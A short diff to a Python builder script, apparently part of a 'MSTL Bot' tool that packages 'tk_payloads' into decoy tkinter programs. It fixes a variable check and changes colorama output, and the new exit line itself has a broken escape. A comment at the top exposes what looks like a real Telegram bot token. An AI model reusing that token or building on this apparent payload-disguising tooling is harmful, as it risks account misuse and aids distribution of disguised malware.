@@ -1,5 +1,5 @@
 # MSTL Bot Normal Token: 6622962602:AAERgZlXugMGZIA5vqkIpv5KKAAsDUrA6is
-from colorama import init, Fore
+from colorama import init, Fore, Style
 from os import system
 import requests
 from json import loads
@@ -134,7 +134,7 @@ try:
     else: 
         code_addr = "builder/tk_payloads/password_maker.py"
     offline_code_addr = str(input(Fore.GREEN + "[+]" + Fore.WHITE + " If you want to use your custome offline tkinter code write C if not press enter: ")).lower()    
-    if code_addr == "c":
+    if offline_code_addr == "c":
         offline_code_addr = input("write your code address(.py file): ")
         if code_addr.endswith(".py"): pass
     else: 
@@ -146,4 +146,4 @@ try:
     else: 
         exit(Fore.CYAN + "\n\n Good Luck \n\n" + Fore.RESET)
 except ValueError: print(Fore.RED + "You must write str."), exit()
-except KeyboardInterrupt: exit("\n\n\nGood Luck\n\n")
+except KeyboardInterrupt: exit(f"\n\n\{Fore.CYAN}nGood Luck{Style.RESET_ALL}\n\n")
